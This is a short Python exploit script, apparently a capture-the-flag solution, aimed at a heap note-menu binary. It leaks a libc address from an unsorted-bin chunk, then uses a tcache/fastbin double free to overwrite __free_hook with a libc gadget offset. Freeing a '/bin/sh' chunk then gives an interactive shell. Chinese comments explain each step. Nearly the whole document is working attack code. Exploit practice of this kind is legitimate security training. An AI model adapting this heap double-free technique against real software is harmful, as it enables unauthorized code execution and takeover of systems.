#coding:utf-8
from PwnContext.core import *

binary = './chall'
debug_libc = './libc.so.6'
elf = ELF(binary)
libc = ELF(debug_libc)

local = 0
if local == 1 :
    p = remote('','')
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    p = ctx.start()
    print "begin!!!"


def add(size,note,call="aaaa"):
    p.sendlineafter("choice:","1")
    p.sendlineafter("name\n",str(size))
    p.sendafter("name:\n",note)
    p.sendafter("call:\n",call)
def delete(index):
    p.sendlineafter("choice:","4")
    p.sendlineafter("index:\n",str(index))
def show(index):
    p.sendlineafter("choice:","2")
    p.sendlineafter("index:\n",str(index))


add(0x500,"aaaa")  # tcache的最大值1024和smallbin的最大值一样。这里申请一个large chunk
add(0x100,"aaaa")  # 隔开 topchunk
delete(0)   # free进入unsortbin
show(0)
addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_addr=addr-0x3b1ca0
print hex(libc_addr)
for i in range(10):   # 0-11
    add(0x60,"a"*0x60)    
for i in range(10):  #free刚刚申请的10个
    delete(i+2)    
delete(10) # 三个fastbin chunk。double free第二个，最后一个fasrbin chunk脱落。前两个形成环状
for i in range(7):  #填满tcache
  add(0x60,"aaaa")
#gdb.attach(p)
#pause()
add(0x60,p64(libc_addr+0x3b38c8-0x13))  #填入free_hook 所在地址
add(0x60,p64(libc_addr+0x3b38c8-0x13))
add(0x60,"/bin/sh\x00")
add(0x60,"a"*0x13+p64(libc_addr+0x41c30))
delete(21) 
p.interactive()
